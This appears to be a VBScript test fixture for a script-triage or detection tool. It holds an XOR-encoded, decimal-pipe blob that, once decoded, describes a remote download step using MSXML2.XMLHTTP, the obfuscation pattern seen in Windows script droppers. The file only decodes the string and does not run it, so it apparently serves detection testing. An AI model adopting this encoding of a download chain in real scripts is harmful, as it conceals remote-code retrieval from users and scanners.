Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_292e7383 = "191|238|149|227|45|189|182|212|236|99|168|176|213|234|55|187|182|251|237|59|164|188|208|250|114|173|186|215|239|63|189|176|204|192|51|172|190|203|237|39|181|178|192|254|46|189|182|214|162|19|154|139|233|211|108|231|139|233|211|22|157|135|244|177|104|231|227|216|236|42|168|180|193|192|61|166|166|202|235|99|251|175|199|254|51|185|178|205|248|48|150|186|192|162|61|168|190|212|254|55|174|189|137|254|58|254|231|198|251|105|172|225|151|227|43|187|191|153|247|42|189|163|215|165|113|230|178|192|168|106|171|183|147|250|108|250|253|193|231|63|164|163|200|250|112|160|189|210|254|50|160|183|139|253|108|250|227|146|171|103|173|253|192|254|42|181|166|215|250|44|150|178|195|250|48|189|238|236|234|48|189|161|193|236|45|133|178|198|176|63|173|228|144|253|58|254|182|150|172"
Const Codec_292e7383 = "decimal_pipe|repeating_key_xor|c9,d3,a4,9f,5e"

Function Load_292e7383()
  Dim parts, result(), i
  parts = Split(Material_292e7383, "|")
  ReDim result(UBound(parts))
  For i = 0 To UBound(parts)
    result(i) = CInt(parts(i))
  Next
  Load_292e7383 = result
End Function

Function Decode_292e7383(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  keyBytes = Array(201,211,164,159,94)
  For i = 0 To UBound(s)
    result(i) = s(i) Xor keyBytes(i Mod 5)
  Next
  Decode_292e7383 = result
End Function

Function Recover_292e7383()
  Dim s, d, t, n, i, p, e, q
  ' configuration reconstruction
n = (19 * 7) - 133
  s = Load_292e7383()
  Do
    d = Decode_292e7383(s)
    Exit Do
  Loop
  t = ""
  For i = 0 To UBound(d)
    t = t & Chr(d(i))
  Next
' reconstruction complete
  Recover_292e7383 = t
End Function

Sub Copy_292e7383(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_292e7383()
  Dim resultText
  Call Copy_292e7383(Recover_292e7383(), resultText)
  Inspect_292e7383 = resultText
End Function
